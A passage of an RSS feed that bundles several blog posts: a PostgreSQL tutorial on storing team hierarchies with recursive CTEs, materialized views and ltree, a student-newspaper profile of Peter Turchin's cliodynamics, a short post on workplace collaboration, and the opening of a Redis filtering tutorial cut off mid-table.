                    <li>
                        <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#testing-1">Testing</a>
                    </li>
                    
                </ol>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#conclusion">Conclusion</a>
                
            </li>
            
        </ol>
    </nav>

                
    <p>It's a common pattern: a database developer at a startup is probably on the Product subteam of the Engineering team at their company. In a department store, shoes are a subcategory of clothing, while your favorite thermos is probably in the travel department.</p>
<p>In any Github organization, there are teams within teams within teams. In any large department store there are categories deeply nested. In any recipe book, there are many ways to classify food.</p>
<p>So how can we model them?</p>
<span id="continue-reading"></span>
<p>Jake (my boyfriend) and I have been exploring relational database concepts out of interest and pure geekery. This was a fun problem that I gave him and we got to work it out together. It was so fun we wanted to share! We won't beat the bush around with PostgreSQL installation, security, setup, blah blah at this time, let's just have some pure database fun for a few minutes!</p>
<h2 id="core-problem">Core Problem</h2>
<p>Handle a high amount of reads and a small amount of writes over a small to medium amount of keys (in this case, a text field), each of which <em>possibly</em> has a reference to a parent key.</p>
<p>In this concrete example, we will replicate team structures. Start with the teams existing inside some small organization, each with a <code>name</code> and possibly a <code>parent</code>:</p>
<table><thead><tr><th>name</th><th>parent</th></tr></thead><tbody>
<tr><td>Engineering</td><td>NULL</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Engineering</td></tr>
<tr><td>Product</td><td>Engineering</td></tr>
<tr><td>Interns</td><td>Product</td></tr>
<tr><td>Administration</td><td>NULL</td></tr>
<tr><td>Human Resources</td><td>Administration</td></tr>
<tr><td>Finance</td><td>Administration</td></tr>
<tr><td>Marketing</td><td>NULL</td></tr>
<tr><td>Logistics</td><td>NULL</td></tr>
<tr><td>国际化</td><td>NULL</td></tr>
</tbody></table>
<p>Then somehow mixin the <code>path</code> which shows the datum's place in the hierarchy.</p>
<table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Administration</td><td>NULL</td><td>{Administration}</td></tr>
<tr><td>Finance</td><td>Administration</td><td>{Administration,Finance}</td></tr>
<tr><td>Human Resources</td><td>Administration</td><td>{Administration,Human Resources}</td></tr>
<tr><td>Engineering</td><td>NULL</td><td>{Engineering}</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Engineering</td><td>{Engineering,Geschäftstätigkeit}</td></tr>
<tr><td>Product</td><td>Engineering</td><td>{Engineering,Product}</td></tr>
<tr><td>Interns</td><td>Product</td><td>{Engineering,Product,Interns}</td></tr>
<tr><td>Logistics</td><td>NULL</td><td>{Logistics}</td></tr>
<tr><td>Marketing</td><td>NULL</td><td>{Marketing}</td></tr>
<tr><td>国际化</td><td>NULL</td><td>{国际化}</td></tr>
</tbody></table>
<p>For this exercise, the exact format of the <code>path</code> is not important. An HTML string, a comma separated list, or any ordered collection is acceptable.</p>
<h2 id="concepts">Concepts</h2>
<p>We'll actually cover two solutions, both of which demonstrate a few core concepts! </p>
<p>For the first solution, ensure you're familiar with the ideas of <a href="https://www.postgresql.org/docs/current/functions-comparison.html"><strong><code>NULL</code></strong></a>, <a href="https://www.postgresql.org/docs/current/ddl-constraints.html#DDL-CONSTRAINTS-PRIMARY-KEYS"><strong>Primary Keys</strong></a>, and <a href="https://www.postgresql.org/docs/current/ddl-constraints.html#DDL-CONSTRAINTS-FK"><strong>Foreign Keys</strong></a>. We'll need these for building safe, efficient linking between teams and their parents.</p>
<p>We'll then use a <a href="https://www.postgresql.org/docs/12/sql-creatematerializedview.html"><strong>Materialized View</strong></a> to create a sort of <em>cache</em> of the point-in-time team structure. We'll refresh this using a <a href="https://www.postgresql.org/docs/12/plpgsql-trigger.html"><strong>Function</strong></a> that is <a href="https://www.postgresql.org/docs/12/trigger-definition.html"><strong>Triggered</strong></a> whenever the original table is written to.</p>
<p>For the next solution, we'll explore the tailor-made <a href="https://www.postgresql.org/docs/12/ltree.html"><strong><code>ltree</code></strong></a> type that can solve our needs without the complex mechanics of the first solution. Further, this solution offers some useful functionality like <code>subpath</code>s.</p>
<h2 id="before-we-start">Before we start</h2>
<p>Please make sure your database is in UTF-8! We're going to be exploring international text today. If you're not sure, let's create a new empty database, and go ahead and connect to it.</p>
<pre><code data-lang="sql"><span>CREATE DATABASE </span><span>organization WITH ENCODING 'UTF8' </span><span>TEMPLATE</span><span>=template0
</span></code></pre><h2 id="solution-1-materialized-views-and-recursive-ctes">Solution 1: Materialized Views and Recursive CTEs</h2>
<pre><code data-lang="sql"><span>CREATE TABLE </span><span>teams</span><span> (
    name   </span><span>TEXT
</span><span>           UNIQUE NOT </span><span>NULL
           </span><span>PRIMARY KEY</span><span>,
    parent </span><span>TEXT
           REFERENCES</span><span> teams (name)
);

CREATE MATERIALIZED VIEW team_structure AS
    </span><span>WITH</span><span> RECURSIVE teams_cte(name, parent, </span><span>path</span><span>) AS (
        </span><span>SELECT </span><span>teams</span><span>.</span><span>name</span><span>, </span><span>teams</span><span>.</span><span>parent</span><span>, ARRAY [</span><span>teams</span><span>.</span><span>name</span><span>]
            </span><span>FROM</span><span> teams
            </span><span>WHERE </span><span>teams</span><span>.</span><span>parent </span><span>IS </span><span>NULL
        </span><span>UNION ALL
        SELECT </span><span>teams</span><span>.</span><span>name</span><span>, </span><span>teams</span><span>.</span><span>parent</span><span>, array_append(</span><span>teams_cte</span><span>.</span><span>path</span><span>, </span><span>teams</span><span>.</span><span>name</span><span>)
            </span><span>FROM</span><span> teams_cte,
                 teams
            </span><span>WHERE </span><span>teams</span><span>.</span><span>parent </span><span>= </span><span>teams_cte</span><span>.</span><span>name
</span><span>    )
    </span><span>SELECT </span><span>*
        </span><span>FROM</span><span> teams_cte;

</span><span>CREATE FUNCTION </span><span>refresh_team_structure</span><span>() RETURNS TRIGGER
    LANGUAGE plpgsql AS
$$
</span><span>BEGIN
</span><span>    REFRESH MATERIALIZED VIEW team_structure;
    RETURN new;
</span><span>END</span><span>;
$$;

</span><span>CREATE TRIGGER </span><span>trigger_update_team_structure
</span><span>    AFTER </span><span>UPDATE </span><span>OR </span><span>INSERT </span><span>OR </span><span>DELETE </span><span>OR </span><span>TRUNCATE
</span><span>    ON teams
EXECUTE PROCEDURE refresh_team_structure();
</span></code></pre><h3 id="testing">Testing</h3>
<p>Loading the example data, including a few complex cases, like spaces, umlauts, and Chinese script:</p>
<pre><code data-lang="sql"><span>INSERT INTO</span><span> teams (name, parent)
    </span><span>VALUES</span><span> ('</span><span>Engineering</span><span>', </span><span>NULL</span><span>),
           ('</span><span>Geschäftstätigkeit</span><span>', '</span><span>Engineering</span><span>'),
           ('</span><span>Product</span><span>', '</span><span>Engineering</span><span>'),
           ('</span><span>Interns</span><span>', '</span><span>Product</span><span>'),
           ('</span><span>Administration</span><span>', </span><span>NULL</span><span>),
           ('</span><span>Human Resources</span><span>', '</span><span>Administration</span><span>'),
           ('</span><span>Finance</span><span>', '</span><span>Administration</span><span>'),
           ('</span><span>Marketing</span><span>', </span><span>NULL</span><span>),
           ('</span><span>Logistics</span><span>', </span><span>NULL</span><span>),
           ('</span><span>国际化</span><span>', </span><span>NULL</span><span>);
</span></code></pre>
<p>Listing all of them:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>ORDER BY path</span><span>;
</span></code></pre><table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Administration</td><td>NULL</td><td>{Administration}</td></tr>
<tr><td>Finance</td><td>Administration</td><td>{Administration,Finance}</td></tr>
<tr><td>Human Resources</td><td>Administration</td><td>{Administration,Human Resources}</td></tr>
<tr><td>Engineering</td><td>NULL</td><td>{Engineering}</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Engineering</td><td>{Engineering,Geschäftstätigkeit}</td></tr>
<tr><td>Product</td><td>Engineering</td><td>{Engineering,Product}</td></tr>
<tr><td>Interns</td><td>Product</td><td>{Engineering,Product,Interns}</td></tr>
<tr><td>Logistics</td><td>NULL</td><td>{Logistics}</td></tr>
<tr><td>Marketing</td><td>NULL</td><td>{Marketing}</td></tr>
<tr><td>国际化</td><td>NULL</td><td>{国际化}</td></tr>
</tbody></table>
<p>A specific one:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>WHERE</span><span> name = '</span><span>Finance</span><span>';
</span></code></pre><table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Finance</td><td>Administration</td><td>{Administration,Finance}</td></tr>
</tbody></table>
<p>Finding all subteams (deep) of a team:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>WHERE </span><span>'</span><span>Product</span><span>' = ANY(</span><span>path</span><span>);
</span></code></pre><table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Product</td><td>Engineering</td><td>{Engineering,Product}</td></tr>
<tr><td>Interns</td><td>Product</td><td>{Engineering,Product,Interns}</td></tr>
</tbody></table>
<p>Let's look at the analysis:</p>
<pre><code data-lang="sql"><span>&gt; EXPLAIN ANALYZE </span><span>SELECT </span><span>* </span><span>FROM</span><span> team_structure </span><span>WHERE </span><span>'</span><span>Product</span><span>' = ANY(</span><span>path</span><span>);
Seq Scan on team_structure  (cost=</span><span>0</span><span>.</span><span>00</span><span>..</span><span>24</span><span>.</span><span>63</span><span> rows=</span><span>3</span><span> width=</span><span>96</span><span>) (actual </span><span>time</span><span>=</span><span>0</span><span>.</span><span>015</span><span>..</span><span>0</span><span>.</span><span>016</span><span> rows=</span><span>2</span><span> loops=</span><span>1</span><span>)
  Filter: ('</span><span>Product</span><span>'::</span><span>text </span><span>= ANY (</span><span>path</span><span>))
  Rows Removed by Filter: </span><span>8
</span><span>Planning </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>047</span><span> ms
Execution </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>026</span><span> ms
</span></code></pre><h2 id="solution-2-ltree-columns">Solution 2: <code>ltree</code> columns</h2>
<blockquote>
<p>Thanks to <a href="https://twitter.com/focusaurus">@focusaurus</a> for giving me the idea to add this section after publication!</p>
</blockquote>
<p><code>ltree</code> is an extension that you should <em>probably</em> already have if your PostgreSQL is an officially distributed package. The <a href="https://www.postgresql.org/docs/12/ltree.html">PostgreSQL docs</a> on the <code>ltree</code> type summarize it quite well, so let's not just repeat them and let's solve our problem!</p>
<p>First, let's note some limitations:</p>
<blockquote>
<p>A label is a sequence of alphanumeric characters and underscores <strong>(for example, in C locale the characters A-Za-z0-9_ are allowed)</strong>. Labels must be <strong>less than 256 bytes long</strong>.</p>
</blockquote>
<p>While the length limit is not terrible, the lack of support for the full UTF-8 spectrum, such as spaces or even words like 工程 or Geschäftstätigkeit is really limiting!</p>
<p>So, when we create our table, let's give it a <code>name</code> column where we can store any e̘̫̩̼͝x̢o̵̞͙̰͕t͈̼̺͍̥ͅi̻͉̺͚͕c̶̥̘͖̪̤̜ text we want. We'll also need a <code>slug</code> column containing the expected fragment in the <code>path</code>.</p>
<pre><code data-lang="sql"><span>CREATE EXTENSION IF NOT EXISTS ltree;
</span><span>CREATE TABLE </span><span>teams</span><span> (
    name </span><span>text
        </span><span>NOT </span><span>NULL</span><span>,
    slug </span><span>text
        </span><span>NOT </span><span>NULL
        </span><span>CHECK</span><span> (slug ~</span><span>* </span><span>'</span><span>^[A-Za-z0-9_]{1,255}$</span><span>'),
    </span><span>path</span><span> ltree
        UNIQUE NOT </span><span>NULL
        </span><span>PRIMARY KEY
</span><span>);
</span></code></pre><h3 id="testing-1">Testing</h3>
<p>Loading the data is a bit different, you'll notice we just insert paths. </p>
<pre><code data-lang="sql"><span>INSERT INTO</span><span> teams (name, slug, </span><span>path</span><span>)
    </span><span>VALUES</span><span> ('</span><span>Engineering</span><span>', '</span><span>Engineering</span><span>', '</span><span>Engineering</span><span>'),
           ('</span><span>Geschäftstätigkeit</span><span>', '</span><span>Operations</span><span>', '</span><span>Engineering.Operations</span><span>'),
           ('</span><span>Product</span><span>', '</span><span>Product</span><span>', '</span><span>Engineering.Product</span><span>'),
           ('</span><span>Interns</span><span>', '</span><span>Interns</span><span>', '</span><span>Engineering.Product.Interns</span><span>'),
           ('</span><span>Administration</span><span>', '</span><span>Administration</span><span>', '</span><span>Administration</span><span>'),
           ('</span><span>Human Resources</span><span>', '</span><span>Human_Resources</span><span>', '</span><span>Administration.Human_Resources</span><span>'),
           ('</span><span>Finance</span><span>', '</span><span>Finance</span><span>', '</span><span>Administration.Finance</span><span>'),
           ('</span><span>Marketing</span><span>', '</span><span>Marketing</span><span>', '</span><span>Marketing</span><span>'),
           ('</span><span>Logistics</span><span>', '</span><span>Logistics</span><span>', '</span><span>Logistics</span><span>'),
           ('</span><span>国际化</span><span>', '</span><span>Internationalization</span><span>','</span><span>Internationalization</span><span>');
</span></code></pre>
<p>Listing all of them:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>ORDER BY path</span><span>;
</span></code></pre><table><thead><tr><th>name</th><th>slug</th><th>path</th></tr></thead><tbody>
<tr><td>Administration</td><td>Administration</td><td>Administration</td></tr>
<tr><td>Finance</td><td>Finance</td><td>Administration.Finance</td></tr>
<tr><td>Human Resources</td><td>Human_Resources</td><td>Administration.Human_Resources</td></tr>
<tr><td>Engineering</td><td>Engineering</td><td>Engineering</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Operations</td><td>Engineering.Operations</td></tr>
<tr><td>Product</td><td>Product</td><td>Engineering.Product</td></tr>
<tr><td>Interns</td><td>Interns</td><td>Engineering.Product.Interns</td></tr>
<tr><td>国际化</td><td>Internationalization</td><td>Internationalization</td></tr>
<tr><td>Logistics</td><td>Logistics</td><td>Logistics</td></tr>
<tr><td>Marketing</td><td>Marketing</td><td>Marketing</td></tr>
</tbody></table>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>WHERE</span><span> slug = '</span><span>Finance</span><span>';
</span></code></pre><table><thead><tr><th>name</th><th>slug</th><th>path</th></tr></thead><tbody>
<tr><td>Finance</td><td>Finance</td><td>Administration.Finance</td></tr>
</tbody></table>
<p>Finding all subteams (deep) of a team:</p>
<pre><code data-lang="sql"><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>WHERE path</span><span> @ '</span><span>Product</span><span>';
</span></code></pre><table><thead><tr><th>name</th><th>slug</th><th>path</th></tr></thead><tbody>
<tr><td>Engineering</td><td>Engineering</td><td>Engineering</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Operations</td><td>Engineering.Operations</td></tr>
<tr><td>Product</td><td>Product</td><td>Engineering.Product</td></tr>
<tr><td>Interns</td><td>Interns</td><td>Engineering.Product.Interns</td></tr>
</tbody></table>
<p>The query plan:</p>
<pre><code data-lang="sql"><span>&gt; EXPLAIN ANALYZE </span><span>SELECT </span><span>* </span><span>FROM</span><span> teams </span><span>WHERE path</span><span> @ '</span><span>Product</span><span>';
Seq Scan on teams  (cost=</span><span>0</span><span>.</span><span>00</span><span>..</span><span>18</span><span>.</span><span>13</span><span> rows=</span><span>1</span><span> width=</span><span>96</span><span>) (actual </span><span>time</span><span>=</span><span>0</span><span>.</span><span>013</span><span>..</span><span>0</span><span>.</span><span>014</span><span> rows=</span><span>2</span><span> loops=</span><span>1</span><span>)
  Filter: (</span><span>path</span><span> @ '</span><span>Product</span><span>'::ltxtquery)
  Rows Removed by Filter: </span><span>8
</span><span>Planning </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>055</span><span> ms
Execution </span><span>Time</span><span>: </span><span>0</span><span>.</span><span>029</span><span> ms
</span></code></pre><h2 id="conclusion">Conclusion</h2>
<p>As you can see, this problem can be tackled in a couple different ways, with some basic SQL concepts used together, or with already existing types! Don't let limitations turn you away, you can overcome them!</p>
<p>I hope this have given you some ideas about new things you can do with your database!</p>


            </article>
        </div></div>]]>
            </description>
            <link>https://hoverbear.org/blog/postgresql-hierarchical-structures</link>
            <guid isPermaLink="false">hacker-news-small-sites-25815370</guid>
            <pubDate>Sun, 17 Jan 2021 21:49:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Peter Turchin: The Magnetism of Mathematical History]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25815127">thread link</a>) | @malwarebytess
<br/>
January 17, 2021 | https://thesciencesurvey.com/top-stories/2021/01/11/peter-turchin-the-magnetism-of-mathematical-history/ | <a href="https://web.archive.org/web/*/https://thesciencesurvey.com/top-stories/2021/01/11/peter-turchin-the-magnetism-of-mathematical-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Why the man who can predict the future is (most decidedly) not a prophet.</p><p><span><div><p><span>The chaos of 2020 launched Peter Turchin from relative obscurity into the spotlight. In 2010, Turchin made the startling </span><a href="https://www.nature.com/articles/463608a"><span>prediction</span></a><span> that “the next decade is likely to be a period of growing instability in the United States and western Europe,” a statement which he supported with statistical data analysis of past historical trends</span><i><span>.</span></i><span>&nbsp;</span></p>
<p><span>The astonishing accuracy of his foresight, substantiated by the tumultuous socio-political events of this past year, have given rise to his sudden notoriety. Turchin’s mathematical history </span><span>—</span><span> a field coined “cliodynamics” </span><span>— </span><span>has now ascended into the realm of academic renown, captivating audiences with its ability to anticipate the future.</span></p>
<p><span>It is rare for an academic like Turchin to grace the pages of </span><a href="https://www.nytimes.com/2020/11/04/magazine/societal-collapse.html"><i><span>The New York Times</span></i></a><i><span>, </span></i><a href="https://www.theatlantic.com/magazine/archive/2020/12/can-history-predict-future/616993/"><i><span>The Atlantic</span></i></a><i><span>, </span></i><a href="https://www.forbes.com/sites/johnmauldin/2020/11/30/this-was-all-predicted-10-years-ago/?sh=448e688e68b5"><i><span>Forbes</span></i></a><i><span>, </span></i><a href="https://www.economist.com/finance-and-economics/2020/10/24/can-too-many-brainy-people-be-a-dangerous-thing"><i><span>The Economist</span></i></a><i><span>, </span></i><span>and </span><a href="https://www.washingtonpost.com/outlook/civil-war-united-states-unlikely-violence/2020/10/29/3a143936-0f0f-11eb-8074-0e943a91bf08_story.html"><i><span>The Washington Post</span></i></a><span> all in the span of a few months. What is even more unusual is that Turchin is not merely lending perspective to a topic in which he has expertise, or contributing to an overarching narrative that extends beyond his persona. He has become the story, the focal point, a figure whose work has garnered so much intrigue that journalists across the country are convinced that he is altering the current trajectory of history.</span></p>
<p><span>But Turchin is somewhat displeased with this attention. He feels that his newfound publicity, tainted by exaggerated rhetoric and sensationalist shock-value, has depicted a warped version of his work. On his website’s </span><a href="http://peterturchin.com/cliodynamica/"><span>blog</span></a><span>, he frequently posts critiques of pieces which he believes are misrepresentations of what it is, exactly, that he does.&nbsp;</span></p>
<p><span>Regarding a </span><a href="https://www.theatlantic.com/magazine/archive/2020/12/can-history-predict-future/616993/"><span>recent Atlantic </span></a><span>story which portrays him as the “mad prophet of Connecticut” (featuring artwork of the Greek deity Apollo, oracle style, laurel-wreath and all), Turchin writes, “I am not a prophet, [and] never claimed to be one. In fact I ha[ve] specifically written about why I eschew prophecy, and </span><a href="http://peterturchin.com/cliodynamica/prophecy-fourth-turning/"><span>am on record criticizing other ‘prophets</span></a><span>.’ As a scientist, I use scientific prediction as a tool to test theories.”&nbsp;</span></p>
<p><span>Evidently, the “prophet” characterization is one that has plagued him for much of his research career. In a blog post dating back to 2013, he writes, “CLIODYNAMICS IS NOT ABOUT PREDICTING THE FUTURE!,” wielding punctuation and capitalization to convey his frustration through the screen.&nbsp;</span></p>
<p><span>“Cliodynamics, instead, is about understanding why and how social systems change,” Turchin explains. “We look for general principles (‘laws’, if you will), and build mathematical models based on these principles. Then comes the most critical part – testing model predictions with historical data so that we can tell which are correct, and which are not,” he adds.</span></p>
<p><span>This systematic collection of historical data allows Turchin and his peers to objectively compare different historical theories, addressing a problem with current historical mediums that Turchin first diagnosed, and now strives to rectify. “History is a wonderful discipline. A lot of reading history books, that’s why I got into history,” Turchin notes with a smile. “Traditional historians have done a great job describing past human societies and how they [have] changed. The problem is not that there are too few explanations </span><span>—</span><span> in some sense, there are too many.”</span></p>
<p><span>To illustrate this idea, Turchin points to the German historian Alexander Demandt’s 1985 book, “Der Fall Roms,” which compiles the vast number of theories that aim to explain Rome’s demise. Demandt ended up with a list of 210, rife with contradictions: asceticism (11) and hedonism (90), Christianity (32) and polytheism (157), militarism (135) and lack of army discipline (125).&nbsp;</span></p>
<p><span>Although Turchin acknowledges that incongruence is inherent within dynamic societies, he contends that “not all of [Demandt’s 210 theories] can be correct. What we need is some kind of mechanism to decide which are better and which are worse, and we do that by empirically testing theories. Cliodynamics is history as science. [As] cliodynamics [progresses], we should see a cemetery of bad theories. Only the better ones will be left standing.”</span></p>
<p><span>T</span><span>o solidify cliodynamics’ standing in the world of academia, Turchin created an eponymous scientific journal that publishes two issues per year. The journal covers topics ranging from recent foreign upheavals (“The Causes and Mechanisms of the Ukrainian Crisis of 2014: A Structural–Demographic Approach”) to macro-level studies of American trends (“A Cultural Evolution Model for Trend Changes in the American Secular Cycle”). All research funded by the journal takes advantage of Turchin’s second noteworthy endeavor, “Seshat,” an archive of historical and archaeological data spanning millennia.&nbsp;</span></p>
<p><span>Joe Manning, Turchin’s collaborator on the Seshat project, and a Professor of History at Yale University, elucidates the significance behind the archive’s carefully chosen moniker, “</span><span>Seshat is an Egyptian deity, a goddess. Her name comes from the ancient Egyptian word ‘to write’,” he says. “‘She who writes’ is the literal translation, but [Seshat] is really in charge of the technical aspects of writing: cataloging and recording. She was the goddess of —really the first in the world— of what we now call databases.”</span></p>
<p><span>To Turchin, transforming history into a data-based medium is a logical next-step in expanding the field’s horizons, “Few people outside of dedicated professional historians know much about the full sweep of our collective past. We are used to thinking about the past in terms of stories of ‘great rulers’ or major battles, but we think of our own world largely through data: the key facts and figures that reveal how modern societies function,” Turchin says.</span></p>
<p><span>“So [although] prediction is instrumental – it is subordinated to the main goal, that of understanding. The chief purpose of mathematics is to make sure that predictions really follow logically from the premises,” he writes.</span></p>
<p><span>Turchin first discovered his love for mathematics in his early childhood, living under the jurisdiction of Soviet rule. Turchin’s childhood home of Obninsk was a haven for scholars, harboring dissidents like his father Valentin, a philosopher-scientist who was eventually forced to flee the USSR in 1978. </span></p>
<p><span>Turchin indicates how lucky his family was to have escaped unharmed, “</span><span>Others ended up in prisons,” he says. “By 1980 the Soviet Union looked like a monolith that was immune to both external and internal challenges.”</span></p>
<p><span>Mr. Fomin, a </span><a href="https://thesciencesurvey.com/spotlight/2019/12/17/the-good-the-great-the-gauss-and-the-fomin/"><span>beloved calculus teacher at Bronx Science</span></a><span> who, like Turchin, grew up in the USSR, contextualizes why so many Russians were drawn to mathematics under Soviet rule. “I don’t think it is a mere coincidence that one of the best schools of theoretical mathematics was created in the former USSR, and general math education was so well developed and successful there,” he said.</span></p>
<p><span>“Imagine a place where schools and colleges — instead of serving as institutions of&nbsp; learning — became the places of indoctrination into the dominant ideology. Imagine a society that constantly rewrites history books, because it sees history not as a heritage that needs to be understood in the context of its time, but merely a tool to control the future. Imagine a country where all papers and television stations coalesced into one giant echo chamber,” Mr. Fomin explains. </span></p>
<p><span>“Now you can begin to understand what kind of country the USSR was. Mathematics became one of the few, select outlets not tainted by corrupt ideology; [a field] where people could pursue objective truth and freely exchange ideas,” he writes.</span></p>
<p><span>Perhaps Turchin, too, found refuge within the indisputable truth of mathematics, within its certainties, existing beyond the fabricated reality of Russia’s post-Stalinist government. It is possible that the intractability of mathematics, its refusal to acquiesce to the will of mankind, was alluring to a young Turchin, who like Mr. Fomin, clung to any remnants of objectivity he could find within a country tarnished by blatant untruths.&nbsp;</span></p>
<p><span>Turchin’s contempt for the weaponization of history at the hands of the corrupt continues to inform his ideology. He embraces mathematics as an ideal medium for recording history because its use of large-scale data sets prevents those in power from cherry-picking narratives tailored to individual agendas.&nbsp;</span></p>
<p><span>Mr. Fomin agrees that this wide-angle approach to history is advantageous, “It can be just as misleading for a researcher to give too much credence to isolated data points, as it is to assign outsized importance to anecdotal evidence and personal experience. While grounding new topics and problems in students’ personal experience can help to make them more accessible in a secondary school setting, limiting discourse to an isolated data point —assigning it disproportionate weight — can have a stifling and misleading effect,” he writes.&nbsp;</span></p>
<p><span>Mr. Fomin concedes that while an “objective, mathematical perspective of history will likely be liked by no one, it might give us much needed balance and continuity.”</span></p>
<p><span>Mr. Fomin’s conjecture is correct. Turchin’s attempt to adapt history, a field which leans into subjectivity and disavows generalizations — into an objective science —&nbsp; has generated controversy among academics. And concerns that a scientific history would fail to represent experiences which deviate from established norms bear weight: when a set of data does not adhere to a singular equation, scientists analyze the general trend and reject nonconforming outliers.&nbsp;</span></p>
<p><span>It is fortunate then, that Turchin is hyper aware of history’s responsibility to reflect all perspectives, including those that are systematically excluded from mainstream narratives. Those who critique Turchin’s work on the premise that cliodynamics attempts to radically transform history possess a fundamental misconception. Turchin does not wish to abolish current narrative-based historical mediums, which center the stories of marginalized people, and laments articles which inaccurately portray his …</span></p></div></span></p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesciencesurvey.com/top-stories/2021/01/11/peter-turchin-the-magnetism-of-mathematical-history/">https://thesciencesurvey.com/top-stories/2021/01/11/peter-turchin-the-magnetism-of-mathematical-history/</a></em></p>]]>
            </description>
            <link>https://thesciencesurvey.com/top-stories/2021/01/11/peter-turchin-the-magnetism-of-mathematical-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25815127</guid>
            <pubDate>Sun, 17 Jan 2021 21:26:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Working with People]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25814847">thread link</a>) | @rammy1234
<br/>
January 17, 2021 | https://lazydevstories.com/post/workingwithpeople/ | <a href="https://web.archive.org/web/*/https://lazydevstories.com/post/workingwithpeople/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
    

    <main id="main">
      
      
      
      
      
      
      
      <div>
        <blockquote>
<p>Life is short to get stuck in a rut, learning is the only way out.</p>
</blockquote>
<p>I think this way. when you go to work, you are working with bunch of people. Every one of them have their own aspirations and style of working. Work in today’s world is not done by force but by mutual support and coordination.</p>
<p>In a Corporate setup, we all work towards the same goal by contributing in our respective roles. It becomes effective if we understand others with whom you will be working before making a judgement or an assumption about their work. We need to know where they come from, context, what their values, Whats their strength. Knowing makes a difference in how you work with them.</p>
<p>You know what’s tough about this? We need to make a conscious effort to get know people. For which communication becomes important.</p>
<p>Trust is all about knowing others enough. Communicating what we think and knowing others thought process is important before we begin working with each other. We need to play to others strength than pointing out their weakness.</p>
<p>If you are managing a group of people, letting them know what are your expectations, immediate goals and where we want to go is important. Likewise it is important for others to let the boss know how they like to work and getting know their boss, that they make their boss effective.</p>

      </div>
      
      
      
    </main>
    
  </div></div>]]>
            </description>
            <link>https://lazydevstories.com/post/workingwithpeople/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25814847</guid>
            <pubDate>Sun, 17 Jan 2021 20:53:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to filter and sort Redis data in a SQL-like way using Sort function]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25814672">thread link</a>) | @eko
<br/>
January 17, 2021 | https://vincent.composieux.fr/article/redis-filter-and-sort-your-data-in-a-sql-like-way-using-sort | <a href="https://web.archive.org/web/*/https://vincent.composieux.fr/article/redis-filter-and-sort-your-data-in-a-sql-like-way-using-sort">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img src="https://vincent.composieux.fr/img/blog/redis-filter-sort.jpeg" alt="Redis: How to filter and sort your data such as using SQL"></p>
<p>Redis is a database that stores your data in memory and is most often used for caching and sometimes also as a message broker.</p>
<p>Most of the time, it is therefore used as a simple key/value cache but it also provides structures to store for example data lists (sets), key/value hashes (hashes / hash sets), sorted sets (sorted sets) and many others.</p>
<p>In this article, we will mainly focus on the <code>Set</code> and <code>HSet</code> types in order to see how we could filter and sort these data, as we would do with SQL.</p>
<p>This is certainly not a good practice, you will in most cases have to use a relational database but it can be useful to know these mechanisms in some cases.</p>

<p>The <code>Sets</code> Redis allow you to insert a set of values under a given key. For example, in the case of a list of products, we can store in Redis the following <code>Set</code>:</p>
<table>
<thead>
<tr>
<th>products</th>
</tr>
</thead>
<tbody>
<tr>
<td>product:id:1</td>
</tr>
<tr>
<td>product:id:2</td>
</tr>
<tr>
<td>product:id:3</td>
</tr>
<tr>
<td>...</td>
</tr>
</tbody>
</table>
<p>The Redis commands for inserting, modifying and listing the elements of a set are, among others : <a href="https://redis.io/commands/sadd">SADD</a>, <a href="https://redis.io/commands/srem">SREM</a> and <a href="https://redis.io/commands/smembers">SMEMBERS</a>.</p>
<p>So to insert our data in the set <code>set:products</code>:</p>

<p>It is then easily possible to create sets containing only the identifiers of the data that must be inside the set, to classify products according to a category, for example.</p>
<p>In case the products with the identifiers <code>1</code> and <code>2</code> are associated to an <code>electronic</code> category, I can add them in a dedicated set, which will be useful later:</p>

<p>So far, nothing very complicated. Now let's go a little further with the <code>HSets</code>.</p>

<p>The <code>HSet</code> allows to store several fields/values in the same key. So we begin to see a relationship with the columns/values in a relational database.</p>
<p>The Redis commands allow to insert/modify and list the fields of an hset are, among others : <a href="https://redis.io/commands/hset">HSET</a>, <a href="https://redis.io/commands/hget">HGET</a> and <a href="https://redis.io/commands/hgetall">HGETALL</a>.</p>
<p>So let's make our product table evolve with new fields : <code>price</code> and <code>created_at</code>.</p>
<p>On the Redis side, we would have the keys with the following field/value pairs:</p>
<table>
<thead>
